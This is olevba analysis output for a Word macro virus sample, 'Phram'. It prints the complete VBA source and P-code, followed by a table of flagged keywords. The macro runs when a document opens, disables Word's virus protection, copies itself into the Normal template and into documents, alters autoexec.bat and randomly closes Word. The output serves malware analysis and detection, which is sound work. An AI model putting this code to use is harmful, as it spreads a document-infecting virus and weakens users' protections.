olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Phram
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Phram - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

'phrame 2000
On Error Resume Next

CommandBars("File").Enabled = True
CommandBars("Tools").Controls("macro").Enabled = True
CommandBars("Help").Enabled = True
Application.EnableCancelKey = 0

Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = (1 - 1)
ScreeenUpdate = 0

DisableAutoMacros = 0
ToolsOptionsSave.GlobalDotPrompt = 0
ToolsOptionsSave.AutoSave = 0

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") <> "phraming the world into the next millenium" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") = "phraming the world into the next millenium"
End If

Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    
NTCL = NT.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
    
    BGN = 2
  
If NT.Name <> "ThisDocument" Then
    If NTCL > 0 Then NT.CodeModule.DeleteLines 1, NTCL
    Set ToInfect = NT
    NT.Name = "ThisDocument"
    DoNT = True
End If

If AD.Name <> "Document" Then
    If ADCL > 0 Then AD.CodeModule.DeleteLines 1, ADCL
    Set ToInfect = AD
    AD.Name = "Document"
    DoAD = True
End If

If DoNT <> True And DoAD <> True Then GoTo PhrameEnd

If DoNT = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, AD.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

If DoAD = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, NT.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

PhrameEnd:

Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
Targ = Mid(Root, 1, 3)

Open Targ + "autoexec.bat" For Append As #1
        Print #1, "pause"
Close #1

Rndnm = Int((Rnd() * 15) + 1)
If Rndnm = 15 Then

    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdWhite
    Selection.TypeText "phraming the world into the next millenium"
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.HomeKey Unit:=wdLine
    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
    Selection.LanguageID = wdNoProofing
    Selection.HomeKey Unit:=wdStory

    ToolsCustomizeKeyboard.KeyCode = 27
    ToolsCustomizeKeyboard.Category = 1
    ToolsCustomizeKeyboard.Name = "Cancel"
    ToolsCustomizeKeyboard.Remove
    ToolsCustomizeKeyboard.Context = 0
    
    SendKeys "%" + "{F4}"

End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Phram
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5364 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x000B "phrame 2000"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	LitDI2 0x0000 
' 	St ScreeenUpdate 
' Line #14:
' Line #15:
' 	LitDI2 0x0000 
' 	St DisableAutoMacros 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld ToolsOptionsSave 
' 	MemSt GlobalDotPrompt 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld ToolsOptionsSave 
' 	MemSt AutoSave 
' Line #18:
' Line #19:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0006 "phrame"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0006 "phrame"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #25:
' Line #26:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #27:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #28:
' Line #29:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #30:
' Line #31:
' 	Ld NT 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #32:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #33:
' 	SetStmt 
' 	Ld NT 
' 	Set ToInfect 
' Line #34:
' 	LitStr 0x000C "ThisDocument"
' 	Ld NT 
' 	MemSt New 
' Line #35:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	Ld AD 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #40:
' 	SetStmt 
' 	Ld AD 
' 	Set ToInfect 
' Line #41:
' 	LitStr 0x0008 "Document"
' 	Ld AD 
' 	MemSt New 
' Line #42:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo PhrameEnd 
' 	EndIf 
' Line #46:
' Line #47:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #48:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #49:
' 	Ld BGN 
' 	LitDI2 0x0063 
' 	Lt 
' 	DoWhile 
' Line #50:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #52:
' 	Loop 
' Line #53:
' 	EndIfBlock 
' Line #54:
' Line #55:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #57:
' 	Ld BGN 
' 	LitDI2 0x0063 
' 	Lt 
' 	DoWhile 
' Line #58:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #60:
' 	Loop 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	Label PhrameEnd 
' Line #64:
' Line #65:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Root 
' Line #66:
' 	Ld Root 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St Targ 
' Line #67:
' Line #68:
' 	Ld Targ 
' 	LitStr 0x000C "autoexec.bat"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #71:
' Line #72:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Rndnm 
' Line #73:
' 	Ld Rndnm 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #74:
' Line #75:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #76:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #77:
' 	Ld wdWhite 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #78:
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #79:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #80:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #81:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x002A 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0003 
' Line #82:
' 	Ld wdNoProofing 
' 	Ld Selection 
' 	MemSt LanguageID 
' Line #83:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #84:
' Line #85:
' 	LitDI2 0x001B 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt KeyCode 
' Line #86:
' 	LitDI2 0x0001 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt Category 
' Line #87:
' 	LitStr 0x0006 "Cancel"
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt New 
' Line #88:
' 	Ld ToolsCustomizeKeyboard 
' 	ArgsMemCall Remove 0x0000 
' Line #89:
' 	LitDI2 0x0000 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt Context 
' Line #90:
' Line #91:
' 	LitStr 0x0001 "%"
' 	LitStr 0x0004 "{F4}"
' 	Add 
' 	ArgsCall SendKeys 0x0001 
' Line #92:
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

